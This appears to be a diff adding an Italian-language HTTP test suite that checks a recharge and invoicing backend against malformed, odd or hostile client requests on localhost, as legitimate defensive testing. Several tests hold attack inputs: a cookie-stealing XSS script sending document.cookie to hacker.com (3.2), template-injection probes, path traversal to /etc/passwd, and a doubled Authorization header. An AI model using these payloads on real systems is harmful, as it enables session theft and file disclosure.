@@ -1,0 +1,345 @@
+### =====================================================================
+### RECHARGE NET — FRONTEND CHAOS & WEIRD BEHAVIORS TEST SUITE
+### Obiettivo: Testare la resilienza del backend contro client impazziti,
+### manipolazioni DOM, estensioni browser malevole e parser JSON deboli.
+### =====================================================================
+
+@base = http://localhost:8080/api/v2
+
+### =====================================================================
+### SEZIONE 1 — HEADERS E MALFORMAZIONI HTTP (RETE / BROWSER WEIRDNESS)
+### =====================================================================
+
+### 1.1 [FRONTEND BUG] Content-Type errato (MIME type confusion) -> ATTESO: 415 Unsupported Media Type
+POST {{base}}/tariffe
+Authorization: Bearer {{tokenAdminA}}
+Content-Type: text/plain
+
+{"operatore":"ooredoo","giga":15.0,"costoAcquisto":7.0,"prezzoVendita":12.0}
+
+###
+
+### 1.2 [FRONTEND BUG] Accept header assurdo (il client si aspetta un'immagine) -> ATTESO: 406 Not Acceptable
+GET {{base}}/tariffe
+Authorization: Bearer {{tokenAdminA}}
+Accept: image/webp,image/apng,*/*;q=0.8
+
+###
+
+### 1.3 [MANIPOLAZIONE] Doppio header Authorization (bypass tentato) -> ATTESO: 400 o ignora il secondo
+GET {{base}}/dashboard/riepilogo
+Authorization: Bearer {{tokenDipA1}}
+Authorization: Bearer {{tokenSuper}}
+
+###
+
+### 1.4 [FRONTEND BUG] Pre-flight impazzito (simula un browser che invia OPTIONS su tutto) -> ATTESO: 200/204 o 405
+OPTIONS {{base}}/fatture
+Access-Control-Request-Method: POST
+Access-Control-Request-Headers: content-type, authorization
+Origin: http://evil-frontend-cors-test.local
+
+###
+
+### 1.5 [WEIRDNESS] Metodo HTTP errato (il frontend fa un POST invece di GET per sbaglio) -> ATTESO: 405 Method Not Allowed
+POST {{base}}/dashboard/riepilogo
+Authorization: Bearer {{tokenAdminA}}
+Content-Type: application/json
+
+{}
+
+###
+
+
+### =====================================================================
+### SEZIONE 2 — JSON PARSING E TYPE CONFUSION (FRONTEND STATE ERRORS)
+### =====================================================================
+
+### 2.1 [TYPE CONFUSION] Array invece di Oggetto nel body -> ATTESO: 400 Bad Request
+POST {{base}}/tariffe
+Authorization: Bearer {{tokenAdminA}}
+Content-Type: application/json
+
+[{"operatore":"ooredoo","giga":15.0,"costoAcquisto":7.0,"prezzoVendita":12.0}]
+
+###
+
+### 2.2 [TYPE CONFUSION] Stringhe vuote per tipi numerici (classico errore di binding dei form HTML) -> ATTESO: 400
+POST {{base}}/tariffe
+Authorization: Bearer {{tokenAdminA}}
+Content-Type: application/json
+
+{"operatore":"orange","giga":"","costoAcquisto":"","prezzoVendita":""}
+
+###
+
+### 2.3 [TYPE CONFUSION] Booleano inviato come stringa "false" o numero (0/1) -> ATTESO: 400 (o parsing tollerante)
+POST {{base}}/ricariche
+Authorization: Bearer {{tokenDipA1}}
+Content-Type: application/json
+
+{"numero":"21234567","giga":10.0,"manuale":"false"}
+
+###
+
+### 2.4 [FRONTEND STATE BUG] Campi extra o variabili interne di stato React/Angular nel JSON -> ATTESO: 200/201 (ignora) o 400 (se strict parsing)
+POST {{base}}/ricariche
+Authorization: Bearer {{tokenDipA1}}
+Content-Type: application/json
+
+{"numero":"21234567","giga":10.0,"manuale":false,"isSubmitting":true,"dirtyFields":["numero"],"$$hashKey":"object:023"}
+
+###
+
+### 2.5 [WEIRDNESS] Formato Esponenziale per i prezzi (valido in JSON, ma la logica di business?) -> ATTESO: 400 o validato
+POST {{base}}/tariffe
+Authorization: Bearer {{tokenAdminA}}
+Content-Type: application/json
+
+{"operatore":"ooredoo","giga":10.0,"costoAcquisto":1e3,"prezzoVendita":1.5e3}
+
+###
+
+### 2.6 [CRASH BAIT] Numero troppo grande (simula overflow di un Double/BigDecimal dal frontend) -> ATTESO: 400
+POST {{base}}/tariffe
+Authorization: Bearer {{tokenAdminA}}
+Content-Type: application/json
+
+{"operatore":"orange","giga":10.0,"costoAcquisto":9999999999999999999999999999.99,"prezzoVendita":10.0}
+
+###
+
+
+### =====================================================================
+### SEZIONE 3 — PAYLOAD SPORCHI, XSS BAIT E CARATTERI INVISIBILI
+### =====================================================================
+
+### 3.1 [DIRTY PAYLOAD] Spazi iniziali/finali nei campi chiave (Trim testing) -> ATTESO: 200 (se fa trim) o 400
+POST {{base}}/auth/login
+Content-Type: application/json
+
+{"username":"  adminA  ","password":" password123 "}
+
+###
+
+### 3.2 [XSS BAIT] Tentativo di iniezione script nella descrizione riga fattura -> ATTESO: 201 (ma sanificato su GET) o 400
+POST {{base}}/fatture
+Authorization: Bearer {{tokenAdminA}}
+Content-Type: application/json
+
+{
+  "tipo": "FACTURE",
+  "dataEmissione": "2026-05-14",
+  "nomeCliente": "<img src=x onerror=alert('XSS')>",
+  "remiseGlobale": 0,
+  "boutiqueId": {{boutiqueA1_id}},
+  "righe": [{"descrizione":"<script>document.location='http://hacker.com/?cookie='+document.cookie;</script>","quantita":1,"prezzoUnitarioHT":10,"aliquotaTVA":19}]
+}
+
+###
+
+### 3.3 [EMOJI & UNICODE] Dati validi ma con caratteri multibyte complessi -> ATTESO: 201 (DB supporta utf8mb4?)
+PUT {{base}}/azienda
+Authorization: Bearer {{tokenAdminA}}
+Content-Type: application/json
+
+{"ragioneSociale":"Telecom 🥷🏽 🚀 Srl","indirizzo":"Via 💥 Tunis","matriculeFiscale":"TN123456A"}
+
+###
+
+### 3.4 [INVISIBLE CHARACTERS] Zero-width spaces nel JSON (per ingannare le validazioni uniche) -> ATTESO: 400
+POST {{base}}/boutique
+Authorization: Bearer {{tokenSuper}}
+Content-Type: application/json
+
+{"nome":"Boutique​Test","citta":"Roma","usernameDipendente":"dip​Hack","passwordDipendente":"pass1234"}
+### (Nota: tra e 'Boutique' e 'Test' c'è un carattere invisibile U+200B)
+
+###
+
+### 3.5 [TEMPLATE INJECTION] SSTI bait nei campi stringa (Jinja, Thymeleaf, Freemarker) -> ATTESO: non deve essere renderizzato!
+POST {{base}}/utenti/admin
+Authorization: Bearer {{tokenSuper}}
+Content-Type: application/json
+
+{"nome":"${7*7}","username":"{{7*7}}","password":"password123"}
+
+
+### =====================================================================
+### SEZIONE 4 — DATE ASSURDE E PARADOSSI TEMPORALI (CALENDARI FRONTEND ROTTI)
+### =====================================================================
+
+### 4.1 [DATES] Timestamp Unix al posto di ISO String (molto comune se frontend usa Date.now()) -> ATTESO: 400
+POST {{base}}/fatture
+Authorization: Bearer {{tokenAdminA}}
+Content-Type: application/json
+
+{
+  "tipo": "FACTURE",
+  "dataEmissione": 1781222400000,
+  "nomeCliente": "Cliente Time",
+  "remiseGlobale": 0,
+  "boutiqueId": {{boutiqueA1_id}},
+  "righe": [{"descrizione":"Test","quantita":1,"prezzoUnitarioHT":10,"aliquotaTVA":19}]
+}
+
+###
+
+### 4.2 [DATES] Formato Data americano MM/DD/YYYY o slash al posto di dash -> ATTESO: 400
+POST {{base}}/fatture
+Authorization: Bearer {{tokenAdminA}}
+Content-Type: application/json
+
+{
+  "tipo": "FACTURE",
+  "dataEmissione": "05/14/2026",
+  "nomeCliente": "Cliente USA",
+  "remiseGlobale": 0,
+  "boutiqueId": {{boutiqueA1_id}},
+  "righe": [{"descrizione":"Test","quantita":1,"prezzoUnitarioHT":10,"aliquotaTVA":19}]
+}
+
+###
+
+### 4.3 [DATES] 29 Febbraio di un anno non bisestile -> ATTESO: 400 (strict validation)
+POST {{base}}/fatture
+Authorization: Bearer {{tokenAdminA}}
+Content-Type: application/json
+
+{
+  "tipo": "FACTURE",
+  "dataEmissione": "2026-02-29",
+  "nomeCliente": "Cliente Bisestile Errato",
+  "remiseGlobale": 0,
+  "boutiqueId": {{boutiqueA1_id}},
+  "righe": [{"descrizione":"Test","quantita":1,"prezzoUnitarioHT":10,"aliquotaTVA":19}]
+}
+
+###
+
+### 4.4 [DATES] Fattura emessa nel 1970 (limiti di business logic?) -> ATTESO: 400 o 201 (dipende dalla logica)
+POST {{base}}/fatture
+Authorization: Bearer {{tokenAdminA}}
+Content-Type: application/json
+
+{
+  "tipo": "FACTURE",
+  "dataEmissione": "1970-01-01",
+  "nomeCliente": "Cliente Retro",
+  "remiseGlobale": 0,
+  "boutiqueId": {{boutiqueA1_id}},
+  "righe": [{"descrizione":"Test","quantita":1,"prezzoUnitarioHT":10,"aliquotaTVA":19}]
+}
+
+
+### =====================================================================
+### SEZIONE 5 — INQUINAMENTO DEI PARAMETRI (HTTP PARAMETER POLLUTION)
+### =====================================================================
+
+### 5.1 [POLLUTION] Frontend invia due volte lo stesso filtro date nell'export -> ATTESO: 400 o prenderne uno solo
+GET {{base}}/export/ricariche?dal=2026-01-01&dal=2026-02-01&al=2026-05-14
+Authorization: Bearer {{tokenAdminA}}
+
+###
+
+### 5.2 [POLLUTION] Array manipulation nei query params per bypassare filtri -> ATTESO: 400
+GET {{base}}/export/ricariche?dal[]=2026-01-01&al[]=2026-05-14
+Authorization: Bearer {{tokenAdminA}}
+
+###
+
+### 5.3 [PAGINATION BAIT] Dimensioni pagina esagerate (Memory Exhaustion) -> ATTESO: Limitato a max (es. 100) o 400
+GET {{base}}/fatture?page=0&size=999999999
+Authorization: Bearer {{tokenAdminA}}
+
+###
+
+### 5.4 [PAGINATION BAIT] Paginazione negativa -> ATTESO: 400
+GET {{base}}/fatture?page=-1&size=-10
+Authorization: Bearer {{tokenAdminA}}
+
+
+### =====================================================================
+### SEZIONE 6 — BUSINESS LOGIC ASSURDA (CASI LIMITE)
+### =====================================================================
+
+### 6.1 [BUSINESS BUG] Ricarica manuale con costi esattamente a 0 (omaggio totale) -> ATTESO: 201 o 400 (se vietato)
+POST {{base}}/ricariche
+Authorization: Bearer {{tokenDipA1}}
+Content-Type: application/json
+
+{"numero":"21234567","giga":10.0,"manuale":true,"costoEffettivo":0.0,"costoCliente":0.0}
+
+###
+
+### 6.2 [BUSINESS BUG] Giga come numero periodico infinito (es. frontend fa 10/3) -> ATTESO: Arrotondato o 400
+POST {{base}}/tariffe
+Authorization: Bearer {{tokenAdminA}}
+Content-Type: application/json
+
+{"operatore":"ooredoo","giga":3.3333333333333335,"costoAcquisto":5.0,"prezzoVendita":10.0}
+
+###
+
+### 6.3 [FATTURE PARADOSSO] Fattura con 10.000 righe (Stress Test Parsing e Salvataggio) -> ATTESO: 413 Payload Too Large o 500/TimeOut
+POST {{base}}/fatture
+Authorization: Bearer {{tokenAdminA}}
+Content-Type: application/json
+
+{
+  "tipo": "FACTURE",
+  "dataEmissione": "2026-05-14",
+  "nomeCliente": "Cliente Massivo",
+  "remiseGlobale": 0,
+  "boutiqueId": {{boutiqueA1_id}},
+  "righe": [
+    // Simulare generazione lato frontend: in un test reale incollare qui migliaia di json objects
+    {"descrizione":"Test 1","quantita":1,"prezzoUnitarioHT":1,"aliquotaTVA":19},
+    {"descrizione":"Test 2","quantita":1,"prezzoUnitarioHT":1,"aliquotaTVA":19},
+    {"descrizione":"Test 3","quantita":1,"prezzoUnitarioHT":1,"aliquotaTVA":19}
+    // ... eccetera ...
+  ]
+}
+
+###
+
+### 6.4 [FATTURE PARADOSSO] Righe fattura con aliquota TVA negativa -> ATTESO: 400
+POST {{base}}/fatture
+Authorization: Bearer {{tokenAdminA}}
+Content-Type: application/json
+
+{
+  "tipo": "FACTURE",
+  "dataEmissione": "2026-05-14",
+  "nomeCliente": "Cliente IVA Strana",
+  "remiseGlobale": 0,
+  "boutiqueId": {{boutiqueA1_id}},
+  "righe": [{"descrizione":"Test","quantita":1,"prezzoUnitarioHT":10,"aliquotaTVA":-19}]
+}
+
+
+### =====================================================================
+### SEZIONE 7 — RACE CONDITION E PATH TRAVERSAL (SIMULAZIONI)
+### =====================================================================
+
+### 7.1 [PATH TRAVERSAL BAIT] Tentativo di estrarre file dal server manipolando path -> ATTESO: 404/400
+GET {{base}}/export/../../../../etc/passwd
+Authorization: Bearer {{tokenAdminA}}
+
+###
+
+### 7.2 [PATH TRAVERSAL BAIT] Parametri per navigare nel file system -> ATTESO: 400
+GET {{base}}/export/ricariche?dal=2026-01-01&al=../../../etc/hosts
+Authorization: Bearer {{tokenAdminA}}
+
+###
+
+### 7.3 [RACE CONDITION BAIT] Cliccato due volte il bottone "Emetti" nel frontend
+### (Da testare in rapida sequenza) -> ATTESO: La prima passa (200), la seconda blocca (400 Già emessa)
+PATCH {{base}}/fatture/{{fatturaA_bozza_id}}/emetti
+Authorization: Bearer {{tokenAdminA}}
+###
+PATCH {{base}}/fatture/{{fatturaA_bozza_id}}/emetti
+Authorization: Bearer {{tokenAdminA}}
+
+###
